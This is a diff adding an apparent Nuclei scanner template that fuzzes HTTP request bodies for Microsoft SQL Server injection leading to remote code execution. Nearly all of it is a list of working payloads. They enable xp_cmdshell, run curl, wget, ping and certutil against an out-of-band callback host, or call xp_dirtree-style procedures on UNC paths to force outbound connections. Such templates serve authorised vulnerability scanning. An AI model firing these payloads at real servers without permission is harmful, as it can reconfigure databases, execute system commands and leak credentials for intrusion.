@@ -1,0 +1,55 @@
+id: mssql-rce-body
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  reference:
+    - https://www.tarlogic.com/blog/red-team-tales-0x01/
+    - https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
+    - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,rce,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        
+    payloads:
+      rce:
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'curl {{interactsh-url}}'--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping {{interactsh-url}}'--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'wget {{interactsh-url}}'--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_dirtree '\\{{interactsh-url}}\';+--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_dirtree '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_fileexist '\\{{interactsh-url}}\';+'"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_fileexist '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_subdirs '\\{{interactsh-url}}\';+'"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_subdirs '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.dbo.xp_dirtree '\\{{interactsh-url}}\';+'"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.dbo.xp_dirtree '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.sys.xp_fileexist '\\{{interactsh-url}}\';+'"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.sys.xp_fileexist '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.sys.xp_subdirs '\\{{interactsh-url}}\';+'"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.sys.xp_subdirs '\\{{interactsh-url}}\';--"
+        - "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'certutil -urlcache -f https://{{interactsh-url}}';--"
+        
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
